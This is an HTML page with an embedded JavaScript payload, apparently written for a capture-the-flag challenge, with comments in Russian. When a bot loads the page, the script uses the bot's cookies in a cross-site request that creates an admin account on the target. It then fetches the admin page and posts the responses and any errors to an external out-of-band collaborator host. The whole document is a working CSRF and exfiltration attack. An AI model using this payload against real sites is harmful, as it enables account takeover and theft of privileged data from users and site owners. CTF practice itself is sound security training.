<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = 'https://tasks.goidactf.ru:20431';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// Когда БОТ загрузит эту страницу, он выполнит код со СВОИМИ куками

// 1. Создаём админа используя куки бота
fetch(TARGET + '/create_admin', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    credentials: 'include', // Ключево! Куки бота отправятся
    body: 'new_admin_login=BOT_CREATED_' + Date.now()
})
.then(response => response.text())
.then(data => {
    // 2. Результат отправляем на наш сервер
    fetch(COLLAB + '/result', {
        method: 'POST',
        mode: 'no-cors',
        body: data.substring(0, 2000)
    });
    
    // 3. Также пробуем получить админскую страницу
    return fetch(TARGET + '/admin', {
        credentials: 'include'
    });
})
.then(response => response.text())
.then(adminPage => {
    // 4. Отправляем админку
    fetch(COLLAB + '/admin_page', {
        method: 'POST',
        mode: 'no-cors',
        body: adminPage.substring(0, 3000)
    });
})
.catch(error => {
    // 5. Отправляем ошибку
    fetch(COLLAB + '/error', {
        method: 'POST',
        mode: 'no-cors',
        body: error.toString()
    });
});
</script>
</body>
</html>
